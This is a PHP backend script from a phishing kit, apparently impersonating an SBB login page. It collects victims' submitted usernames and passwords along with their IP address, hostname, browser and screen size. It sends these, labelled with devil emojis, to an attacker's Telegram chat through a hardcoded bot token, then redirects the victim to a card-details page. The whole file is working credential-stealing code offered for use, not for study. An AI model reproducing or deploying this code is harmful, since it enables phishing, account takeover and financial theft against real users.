<?php
session_start();
$botToken = "7680764335:AAF1DVT5n0Cye90-1W-eBWkE9gFZJ-iUPX8";
$chatID = "-1002229212231";

// Récupération des données
$email = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$browser = get_browser(null, true)['browser'];
$screen = $_POST['screen'] ?? '';

// Stockage en session
$_SESSION['email'] = $email;
$_SESSION['password'] = $password;
$_SESSION['victim_info'] = compact('ip', 'hostname', 'browser', 'screen');

// Construction du message
$date = date('l d F Y @ H:i');
$message = "
|++++++++| 😈 SBB - INFOS 😈 |++++++++|
|
|💶 LOGIN 💶 : $email
|🔐 PASS 🔐 : $password
|
|+++++++| 😈 CARD - INFOS 😈 |+++++++|
|
|Submitted by: $ip ($hostname)
|Browser: $browser
|Screen Size: $screen
|Received: $date
|
|++++++| 😈  😈  Lajded 😈  😈 |++++++|
";

// Envoi à Telegram
sendToTelegram($message);

// Redirection
header('Location: card.html');
exit();

function sendToTelegram($text) {
    global $botToken, $chatID;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ['chat_id' => $chatID, 'text' => $text];
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    file_get_contents($url, false, stream_context_create($options));
}
?>